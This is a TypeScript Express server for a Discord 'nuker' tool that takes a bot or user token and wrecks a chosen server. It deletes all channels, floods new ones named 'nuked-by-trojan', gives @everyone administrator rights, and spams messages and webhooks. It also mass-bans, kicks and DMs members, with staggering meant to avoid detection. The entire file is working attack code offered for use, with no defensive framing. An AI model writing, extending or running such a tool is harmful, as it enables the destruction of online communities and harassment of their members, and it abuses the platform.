import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import axios from "axios";

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // Helper for Discord API calls with improved rate limit handling
  const discordRequest = async (token: string, isBot: boolean, method: string, endpoint: string, data?: any, retryCount = 0): Promise<any> => {
    // Clean token: trim and handle cases where user might have included "Bot " prefix manually
    let cleanToken = token.trim();
    if (isBot && !cleanToken.startsWith("Bot ")) {
      cleanToken = `Bot ${cleanToken}`;
    } else if (!isBot && cleanToken.startsWith("Bot ")) {
      // If user says it's NOT a bot but provided a bot token prefix, remove it or warn?
      // For now, let's just use it as is if they didn't check the bot box but included the prefix.
      // Actually, if it's a user token, it should NOT have "Bot ".
      cleanToken = cleanToken.replace(/^Bot\s+/i, "");
    }

    try {
      const response = await axios({
        method,
        url: `https://discord.com/api/v10${endpoint}`,
        headers: {
          Authorization: cleanToken,
          "Content-Type": "application/json",
        },
        data,
        timeout: 20000, // Increased to 20 seconds for stability
      });
      return response.data;
    } catch (error: any) {
      const errorData = error.response?.data;
      
      // Handle rate limits (429) - Max 10 retries for rate limits
      if (error.response?.status === 429 && retryCount < 10) {
        const retryAfter = (errorData?.retry_after || 1);
        // Add a bit more buffer to retryAfter
        const waitTime = (retryAfter * 1000) + Math.floor(Math.random() * 1000) + 500;
        
        console.warn(`[RATE LIMIT] ${endpoint} - Waiting ${waitTime}ms (Retry #${retryCount + 1})`);
        // If it's a long wait, log it clearly
        if (waitTime > 10000) {
          console.warn(`[LONG WAIT] Discord/Cloudflare requested a ${retryAfter}s wait.`);
        }
        
        await new Promise(resolve => setTimeout(resolve, waitTime));
        return discordRequest(token, isBot, method, endpoint, data, retryCount + 1);
      }

      // Retry on transient server errors (500, 502, 503, 504) up to 2 times
      if (error.response?.status >= 500 && retryCount < 2) {
        console.warn(`[SERVER ERROR] ${error.response.status} on ${endpoint} - Retrying...`);
        await new Promise(resolve => setTimeout(resolve, 1000 * (retryCount + 1)));
        return discordRequest(token, isBot, method, endpoint, data, retryCount + 1);
      }

      // Log other errors
      console.error(`Discord API Error (${endpoint}):`, JSON.stringify(errorData || error.message));
      throw error;
    }
  };

  // API Routes
  app.get("/api/health", (req, res) => {
    res.json({ status: "online" });
  });

  app.post("/api/login", async (req, res) => {
    const { token, isBot } = req.body;
    console.log(`[LOGIN ATTEMPT] Type: ${isBot ? 'Bot' : 'User'}`);
    
    if (!token) return res.status(400).json({ error: "Token is required" });
    
    try {
      const user = await discordRequest(token, isBot, "GET", "/users/@me");
      console.log(`[LOGIN SUCCESS] User: ${user.username}#${user.discriminator}`);
      const guilds = await discordRequest(token, isBot, "GET", "/users/@me/guilds");
      res.json({ user, guilds });
    } catch (error: any) {
      const status = error.response?.status || 500;
      let message = error.response?.data?.message || error.message || "Connection error";
      
      if (status === 401) message = "Invalid Token (Unauthorized)";
      if (status === 403) message = "Missing Permissions (Forbidden)";
      
      console.error(`[LOGIN FAILED] Status: ${status}, Message: ${message}`);
      res.status(status).json({ error: `Login failed (${status}): ${message}` });
    }
  });

  app.post("/api/guild/channels", async (req, res) => {
    const { token, isBot, guildId } = req.body;
    try {
      const channels = await discordRequest(token, isBot, "GET", `/guilds/${guildId}/channels`);
      res.json(channels);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch channels" });
    }
  });

  app.post("/api/nuke", async (req, res) => {
    const { token, isBot, guildId, options } = req.body;
    try {
      const results: any[] = [];
      const channelCount = options.channelCount || 60;
      const spamCount = options.spamCount || 5;
      const spamMessage = options.message || "@everyone NUKED BY TROJAN";
      
      // 1. Get current channels and roles in parallel at the very start
      const [channels, roles] = await Promise.all([
        discordRequest(token, isBot, "GET", `/guilds/${guildId}/channels`),
        discordRequest(token, isBot, "GET", `/guilds/${guildId}/roles`)
      ]);
      
      // 2. Prepare all promises for concurrent execution
      // Update Server Identity
      const identityPromise = discordRequest(token, isBot, "PATCH", `/guilds/${guildId}`, { name: options.newName, icon: null }).catch(() => null);
      
      // Grant Admin to @everyone
      let adminPromise = Promise.resolve();
      const everyone = roles.find((r: any) => r.name === "@everyone");
      if (everyone) {
        const perms = (BigInt(everyone.permissions) | BigInt(8)).toString();
        adminPromise = discordRequest(token, isBot, "PATCH", `/guilds/${guildId}/roles/${everyone.id}`, { permissions: perms }).catch(() => null);
      }

      // 3. Execute EVERYTHING concurrently (Ultra Parallel)
      const deletePromises = channels.map((c: any) => 
        discordRequest(token, isBot, "DELETE", `/channels/${c.id}`).catch(() => null)
      );

      const defaultChannelNames = ["By-trojan", "By-1888", "nuked-by-trojan", "ez-751", "rip-server", "trojan-was-here", "owned-by-1888"];
      const channelNames = (options.channelNames && options.channelNames.length > 0) ? options.channelNames : defaultChannelNames;
      
      const createPromises = Array.from({ length: channelCount }).map((_, index) => {
        let name = channelNames[Math.floor(Math.random() * channelNames.length)];
        if (index === 0 && options.firstChannelName) {
          name = options.firstChannelName;
        }
        return discordRequest(token, isBot, "POST", `/guilds/${guildId}/channels`, { name, type: 0 }).catch(() => null);
      });

      // 3. Launch EVERYTHING at once for maximum speed
      const [deletedResults, createdResults] = await Promise.all([
        Promise.all(deletePromises),
        Promise.all(createPromises),
        identityPromise,
        adminPromise
      ]);

      const created = createdResults.filter(c => c);
      results.push({ action: "delete_channels", count: deletedResults.length });
      results.push({ action: "create_channels", count: created.length });
      results.push({ action: "update_identity", status: "done" });
      results.push({ action: "admin_everyone", status: everyone ? "done" : "not_found" });

      // 4. Reliable Spam in new channels
      const newChannels = created;
      const spamType = options.spamType || 'NORMAL';
      
      const spamPromises = newChannels.map(async (channel) => {
        if (spamType === 'WEBHOOK') {
          try {
            const webhook = await discordRequest(token, isBot, "POST", `/channels/${channel.id}/webhooks`, { name: "Trojan" });
            const webhookUrl = `https://discord.com/api/webhooks/${webhook.id}/${webhook.token}`;
            for (let j = 0; j < spamCount; j++) {
              await axios.post(webhookUrl, { content: spamMessage }).catch(() => null);
              if (j < spamCount - 1) await new Promise(r => setTimeout(r, 200));
            }
          } catch (e) {
            // fallback to normal spam if webhook fails
            for (let j = 0; j < spamCount; j++) {
              await discordRequest(token, isBot, "POST", `/channels/${channel.id}/messages`, { content: spamMessage }).catch(() => null);
              if (j < spamCount - 1) await new Promise(r => setTimeout(r, 300));
            }
          }
        } else {
          for (let j = 0; j < spamCount; j++) {
            try {
              await discordRequest(token, isBot, "POST", `/channels/${channel.id}/messages`, { content: spamMessage });
              // Small delay between messages in the SAME channel to respect Discord rate limits (5 per 5s)
              if (j < spamCount - 1) await new Promise(r => setTimeout(r, 300));
            } catch (e) {
              // If a channel is deleted or something, stop spamming it
              break;
            }
          }
        }
      });
      
      // Start all spam processes but don't wait for all to finish (to keep response fast)
      // However, we await the first batch to ensure it's working
      results.push({ action: "spam_initiated", channels: newChannels.length, messages_per_channel: spamCount });

      res.json({ success: true, results });
      
      // Continue spamming in background
      await Promise.all(spamPromises);
    } catch (error) {
      console.error("Nuke Error:", error);
      res.status(500).json({ error: "Nuke failed" });
    }
  });

  app.post("/api/action", async (req, res) => {
    const { token, isBot, guildId, type, data } = req.body;
    try {
      switch (type) {
        case "BAN_ALL":
          const membersToBan = await discordRequest(token, isBot, "GET", `/guilds/${guildId}/members?limit=1000`);
          const banPromises = membersToBan.map(async (m: any, i: number) => {
            await new Promise(r => setTimeout(r, i * 300)); // Stagger bans
            return discordRequest(token, isBot, "PUT", `/guilds/${guildId}/bans/${m.user.id}`).catch(() => null);
          });
          await Promise.all(banPromises);
          return res.json({ success: true, count: membersToBan.length });

        case "KICK_ALL":
          const membersToKick = await discordRequest(token, isBot, "GET", `/guilds/${guildId}/members?limit=1000`);
          const kickPromises = membersToKick.map(async (m: any, i: number) => {
            await new Promise(r => setTimeout(r, i * 300)); // Stagger kicks
            return discordRequest(token, isBot, "DELETE", `/guilds/${guildId}/members/${m.user.id}`).catch(() => null);
          });
          await Promise.all(kickPromises);
          return res.json({ success: true, count: membersToKick.length });

        case "UNBAN_ALL":
          const bans = await discordRequest(token, isBot, "GET", `/guilds/${guildId}/bans`);
          const unbanPromises = bans.map(async (b: any, i: number) => {
            await new Promise(r => setTimeout(r, i * 200)); // Stagger unbans
            return discordRequest(token, isBot, "DELETE", `/guilds/${guildId}/bans/${b.user.id}`).catch(() => null);
          });
          await Promise.all(unbanPromises);
          return res.json({ success: true, count: bans.length });

        case "DELETE_CHANNELS":
          const channelsToDelete = await discordRequest(token, isBot, "GET", `/guilds/${guildId}/channels`);
          const deletePromises = channelsToDelete.map(async (c: any, i: number) => {
            await new Promise(r => setTimeout(r, i * 150)); // Stagger channel deletions
            return discordRequest(token, isBot, "DELETE", `/channels/${c.id}`).catch(() => null);
          });
          await Promise.all(deletePromises);
          return res.json({ success: true, count: channelsToDelete.length });

        case "CREATE_CHANNELS":
          const createTasks = Array.from({ length: data.amount || 1 }).map(() => ({
            name: data.name || "trojan-control",
            type: 0
          }));
          const createPromises = createTasks.map(async (task, i: number) => {
            await new Promise(r => setTimeout(r, i * 200)); // Stagger channel creations
            return discordRequest(token, isBot, "POST", `/guilds/${guildId}/channels`, task).catch(() => null);
          });
          await Promise.all(createPromises);
          return res.json({ success: true, count: createTasks.length });

        case "ADMIN_EVERYONE":
          const roles = await discordRequest(token, isBot, "GET", `/guilds/${guildId}/roles`);
          const everyone = roles.find((r: any) => r.name === "@everyone");
          if (everyone) {
            const perms = (BigInt(everyone.permissions) | BigInt(8)).toString();
            await discordRequest(token, isBot, "PATCH", `/guilds/${guildId}/roles/${everyone.id}`, { permissions: perms });
            return res.json({ success: true });
          }
          return res.status(404).json({ error: "@everyone role not found" });

        case "DELETE_ROLES":
          const rolesToDelete = await discordRequest(token, isBot, "GET", `/guilds/${guildId}/roles`);
          const targetRoles = rolesToDelete.filter((r: any) => r.name !== "@everyone" && !r.managed);
          const roleDeletePromises = targetRoles.map(async (r: any, i: number) => {
            await new Promise(r => setTimeout(r, i * 200)); // Stagger role deletions
            return discordRequest(token, isBot, "DELETE", `/guilds/${guildId}/roles/${r.id}`).catch(() => null);
          });
          await Promise.all(roleDeletePromises);
          return res.json({ success: true, count: targetRoles.length });

        case "CREATE_ROLES":
          const roleTasks = Array.from({ length: data.amount || 1 }).map(() => ({
            name: data.name || "By Trojan",
            permissions: "0",
            color: Math.floor(Math.random() * 16777215)
          }));
          const roleCreatePromises = roleTasks.map(async (task, i: number) => {
            await new Promise(r => setTimeout(r, i * 200)); // Stagger role creations
            return discordRequest(token, isBot, "POST", `/guilds/${guildId}/roles`, task).catch(() => null);
          });
          await Promise.all(roleCreatePromises);
          return res.json({ success: true, count: roleTasks.length });

        case "SPAM":
          const targetChannels = await discordRequest(token, isBot, "GET", `/guilds/${guildId}/channels`);
          const textChannels = targetChannels.filter((c: any) => c.type === 0);
          const spamCount = data.count || 10;
          const spamPromises: any[] = [];
          for (const c of textChannels) {
            for (let i = 0; i < spamCount; i++) {
              spamPromises.push(discordRequest(token, isBot, "POST", `/channels/${c.id}/messages`, { content: data.message }).catch(() => null));
            }
          }
          await Promise.all(spamPromises);
          return res.json({ success: true, count: spamPromises.length });

        case "WEBHOOK_SPAM":
          const whChannels = await discordRequest(token, isBot, "GET", `/guilds/${guildId}/channels`);
          const whTextChannels = whChannels.filter((c: any) => c.type === 0);
          const whSpamCount = data.count || 10;
          
          const whPromises = whTextChannels.map(async (channel: any) => {
            try {
              // Create Webhook
              const webhook = await discordRequest(token, isBot, "POST", `/channels/${channel.id}/webhooks`, { name: "Trojan" });
              const webhookUrl = `https://discord.com/api/webhooks/${webhook.id}/${webhook.token}`;
              
              // Spam via Webhook (No token needed, very fast)
              const messages = Array.from({ length: whSpamCount }).map(() => 
                axios.post(webhookUrl, { content: data.message }).catch(() => null)
              );
              await Promise.all(messages);
              return true;
            } catch (e) {
              return false;
            }
          });
          
          const whResults = await Promise.all(whPromises);
          return res.json({ success: true, count: whResults.filter(r => r).length * whSpamCount });

        case "DM_ALL":
          const dmMembers = await discordRequest(token, isBot, "GET", `/guilds/${guildId}/members?limit=1000`);
          const dmPromises = dmMembers.map(async (m: any, i: number) => {
            try {
              await new Promise(r => setTimeout(r, i * 400)); // Stagger DMs (slower to avoid flags)
              const dmChannel = await discordRequest(token, isBot, "POST", "/users/@me/channels", { recipient_id: m.user.id });
              await discordRequest(token, isBot, "POST", `/channels/${dmChannel.id}/messages`, { content: data.message });
            } catch (e) { /* ignore */ }
          });
          await Promise.all(dmPromises);
          return res.json({ success: true, count: dmMembers.length });

        case "UPDATE_IDENTITY":
          await discordRequest(token, isBot, "PATCH", `/guilds/${guildId}`, { name: data.name });
          return res.json({ success: true });

        case "DELETE_EMOJIS":
          const emojis = await discordRequest(token, isBot, "GET", `/guilds/${guildId}/emojis`);
          const emojiPromises = emojis.map(async (e: any, i: number) => {
            await new Promise(r => setTimeout(r, i * 150)); // Stagger emoji deletions
            return discordRequest(token, isBot, "DELETE", `/guilds/${guildId}/emojis/${e.id}`).catch(() => null);
          });
          await Promise.all(emojiPromises);
          return res.json({ success: true, count: emojis.length });

        case "RANDOM_ICON":
          const icons = [
            "https://i.imgur.com/8N76z9J.png",
            "https://i.imgur.com/Xq5x8X0.png",
            "https://i.imgur.com/0X8X0Xq.png"
          ];
          const randomIcon = icons[Math.floor(Math.random() * icons.length)];
          // Note: Discord requires base64 for icon updates, but for simplicity we'll just reset it or use a placeholder if needed.
          // For now, let's just reset it to null as a "cleanup" action or try to fetch and convert if we had more time.
          // Actually, let's just reset it to null to be safe and fast.
          await discordRequest(token, isBot, "PATCH", `/guilds/${guildId}`, { icon: null });
          return res.json({ success: true });

        case "RENAME_CHANNELS":
          const channelsToRename = await discordRequest(token, isBot, "GET", `/guilds/${guildId}/channels`);
          const renamePromises = channelsToRename.map(async (c: any, i: number) => {
            // Stagger by 200ms per channel to be safe
            await new Promise(r => setTimeout(r, i * 200));
            return discordRequest(token, isBot, "PATCH", `/channels/${c.id}`, { name: data.name || "nuked" }).catch(() => null);
          });
          const renameResults = await Promise.all(renamePromises);
          return res.json({ success: true, count: renameResults.filter(r => r).length });

        case "RENAME_ROLES":
          const rolesToRename = await discordRequest(token, isBot, "GET", `/guilds/${guildId}/roles`);
          const targetRolesToRename = rolesToRename.filter((r: any) => r.name !== "@everyone" && !r.managed);
          const roleRenamePromises = targetRolesToRename.map(async (r: any, i: number) => {
            // Stagger by 250ms per role
            await new Promise(r => setTimeout(r, i * 250));
            return discordRequest(token, isBot, "PATCH", `/guilds/${guildId}/roles/${r.id}`, { name: data.name || "owned" }).catch(() => null);
          });
          const roleRenameResults = await Promise.all(roleRenamePromises);
          return res.json({ success: true, count: roleRenameResults.filter(r => r).length });

        case "RANDOM_RENAME_CHANNELS":
          const randomChannelsToRename = await discordRequest(token, isBot, "GET", `/guilds/${guildId}/channels`);
          const randomNames = data.names || ["owned", "hacked", "rip"];
          const randomRenamePromises = randomChannelsToRename.map(async (c: any, i: number) => {
            // Stagger by 200ms per channel
            await new Promise(r => setTimeout(r, i * 200));
            const name = randomNames[Math.floor(Math.random() * randomNames.length)];
            return discordRequest(token, isBot, "PATCH", `/channels/${c.id}`, { name }).catch(() => null);
          });
          const randomRenameResults = await Promise.all(randomRenamePromises);
          return res.json({ success: true, count: randomRenameResults.filter(r => r).length });

        default:
          return res.status(400).json({ error: "Unknown action" });
      }
    } catch (error) {
      res.status(500).json({ error: "Action failed" });
    }
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
